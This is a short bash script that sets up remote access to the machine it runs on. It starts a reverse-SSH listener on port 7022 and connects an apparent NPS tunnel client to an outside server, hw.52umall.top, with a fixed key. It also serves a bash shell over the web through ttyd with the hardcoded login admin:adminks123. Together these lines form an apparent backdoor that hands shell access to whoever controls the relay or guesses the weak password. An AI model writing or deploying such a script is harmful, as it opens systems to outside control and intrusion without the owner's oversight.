#!/bin/bash
mkdir ~/.screen && chmod 700 ~/.screen
export SCREENDIR=$HOME/.screen
~/reverse-sshx64  -v -l -p 7022  &
~/npc  -server=hw.52umall.top:7006  -vkey=key-313 -type=tcp &
/usr/bin/ttyd -p $PORT -c admin:adminks123 bash
